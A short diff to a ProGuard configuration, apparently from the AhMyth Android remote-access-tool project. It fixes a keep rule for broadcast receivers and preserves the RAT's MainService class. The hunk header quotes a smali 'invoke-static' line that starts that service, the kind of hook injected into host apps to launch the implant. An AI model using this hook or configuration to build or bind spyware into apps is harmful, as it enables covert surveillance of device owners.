@@ -19,7 +19,7 @@ invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 
 -keep public class * extends android.app.Service
 
--keep public class * extends android.content.MyReceiver
+-keep public class * extends android.content.BroadcastReceiver
 
 -keep class ahmyth.mine.king.ahmyth.MainService {
 
